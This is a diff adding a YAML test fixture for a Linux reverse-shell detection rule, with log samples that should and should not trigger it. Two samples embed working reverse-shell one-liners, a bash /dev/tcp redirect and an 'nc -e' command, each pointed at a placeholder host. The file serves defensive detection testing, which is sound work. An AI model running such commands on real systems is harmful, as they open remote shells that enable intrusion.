@@ -1,0 +1,14 @@
+title: Reverse Shell Fixtures
+rule: rules/linux/reverse_shell.yml
+tests:
+  - description: "Should fire: bash tcp redirect"
+    should_match: true
+    log: '{"host":"web-01","process":"bash","message":"/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1","level":"critical"}'
+
+  - description: "Should fire: nc -e pattern"
+    should_match: true
+    log: '<13>1 2026-06-02T03:00:00Z web-01 bash - - - nc -e /bin/bash 203.0.113.5 4444'
+
+  - description: "Should NOT fire: normal bash usage"
+    should_match: false
+    log: '<13>1 2026-06-02T10:00:00Z web-01 bash - - - /bin/bash /usr/local/bin/deploy.sh'
